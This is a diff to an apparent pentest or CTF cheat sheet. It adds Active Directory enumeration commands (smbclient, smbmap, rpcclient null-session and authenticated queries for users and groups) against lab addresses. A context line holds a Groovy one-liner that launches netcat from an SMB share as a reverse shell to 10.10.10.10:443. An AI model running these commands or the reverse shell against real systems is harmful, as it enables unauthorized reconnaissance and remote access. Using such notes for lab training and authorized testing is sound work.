@@ -18,6 +18,38 @@ println "\\\\10.10.10.10\\smbFolder\\nc.exe -e 10.10.10.10 443".execute().text
 ------------------------------------------------------------------------------------------------------
 # Windows Section
 
+## Active Directory Enumeration
+
+### SMBClient
+
+```shell
+smbclient -L 10.10.10.250 -N
+```
+
+### SMBMap
+
+```shell
+# Unauthenticated
+smbmap -H 10.10.10.250 -u 'null'
+
+# Authenticated to a share 
+smbmap -H 10.10.10.250 -u
+```
+
+### RPCClient
+
+```powershell
+# Unauthenticated (Null Session)
+rpcclient -U "" 10.10.10.250
+
+# Authenticated
+rpcclient -U "username%password" 10.10.10.250
+enumdomusers
+enumdomgroups
+querygroupmem <rid>
+queryuser <rid>
+```
+
 # Kerberos
 
 ## Enumerating valid users
